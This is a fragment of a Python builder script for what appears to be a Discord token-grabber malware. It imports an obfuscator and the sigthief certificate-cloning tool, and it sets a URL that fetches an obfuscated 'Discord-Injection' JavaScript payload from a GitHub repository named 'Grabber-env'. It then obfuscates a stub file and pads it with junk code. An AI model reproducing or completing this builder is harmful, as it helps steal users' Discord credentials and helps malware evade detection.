...
disable_warnings()
import OBF as obfuscator
from sigthief import outputCert

SettingsFile = "config.json"
InCodeFile = "stub.py"
OutCodeFile = "stub-o.py"
InjectionURL = "https://raw.githubusercontent.com/Nagisalpx/Grabber-env/main/Discord-Injection-BG/injection-obfuscated.js"
...
def main() -> None:
    ...
    obfuscator.OBF(code, OutCodeFile)
    junk(OutCodeFile)
